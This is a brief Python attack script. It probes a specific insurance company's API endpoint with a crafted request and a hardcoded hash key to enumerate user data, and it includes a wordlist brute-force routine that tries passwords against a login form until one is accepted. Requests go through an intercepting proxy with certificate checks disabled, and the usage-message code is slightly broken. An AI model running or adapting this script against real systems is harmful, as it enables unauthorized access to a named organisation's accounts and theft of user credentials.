import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
logs = ""

def find_username(url):
    data = {"userId": "ECCLUSER", "policy": [{"polSeqNo": None, "lineCd":None,"issueYear":None, "renewNo":None,"endtYear":None,"assdNo":None,"sublineCd":None,"issCd":None,"endtIssCd":None,"intmNo":"743"}]}
    hashKey = "2d4cb58c7ca34f8edb6bd81c0f685f1706d5dea54117eb05e7308aa2afe4abc3"
    headers = {'hashKey': hashKey}
    r = requests.post(url, verify=False, proxies=proxies, json=data, headers=headers)
    res = r.text
    print(res)
        

def find_password(url, username):
    logs = "Findings password "
    with open('../password_list.txt') as f:
        lines = f.readlines()
        for password in lines:
            sys.stdout.write('\r' + logs + password.strip("\n"))
            sys.stdout.flush()
            data = {"username": username, "password": password.strip("\n") }
            r = requests.post(url, verify=False, proxies=proxies, data=data)
            res = r.text
            if 'Incorrect password' not in res:
                logs = "username: %s \n Password: %s" % (username, password.strip('\n'))
                sys.stdout.write('\r' + logs)
                sys.stdout.flush()
                break

def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Findings valid username")
	# password_length = sql_password_length(url)
	find_username("http://ecom.mic.com.ph:8081/Geniisys/api/v1.0/polendt/basicinfo")
	
	
if __name__ == "__main__":
	main()